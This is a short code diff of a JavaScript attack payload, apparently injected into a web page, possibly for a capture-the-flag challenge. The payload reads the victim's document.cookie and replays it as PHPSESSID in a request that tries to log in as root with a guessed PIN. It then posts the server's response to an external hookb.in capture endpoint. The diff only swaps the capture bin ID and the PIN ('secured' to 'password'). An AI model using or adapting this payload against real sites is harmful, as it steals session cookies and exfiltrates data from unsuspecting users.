@@ -9,7 +9,7 @@
         http.onload = function () {
             //if (http.readyState === http.DONE) {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/037ja8WyP9F3J0ooPpRl', true);
+                xhr.open('POST', 'https://hookb.in/3OLjbRY26XT7yakkMrLP', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseText));
         
@@ -18,7 +18,7 @@
         const cook = document.cookie;
 
 
-        http.send("PHPSESSID="+cook+"&username=root&pin=secured&notRobot=on");
+        http.send("PHPSESSID="+cook+"&username=root&pin=password&notRobot=on");
 //     }
 // }
    
